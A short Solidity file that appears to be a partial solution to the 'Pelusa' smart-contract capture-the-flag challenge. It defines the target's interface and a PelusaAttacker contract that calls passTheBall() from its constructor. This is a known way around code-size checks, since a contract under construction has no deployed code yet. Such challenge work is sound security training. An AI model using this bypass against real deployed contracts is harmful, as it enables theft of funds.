// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

interface IPelusa {
    function passTheBall() external;

    function isGoal() external view returns (bool);

    function shoot() external;
}

contract PelusaAttacker {
    address immutable attacker;
    IPelusa immutable pelusa;

    constructor(address _pelu) {
        pelusa = IPelusa(_pelu);
        attacker = msg.sender;
        pelusa.passTheBall();
    }
}
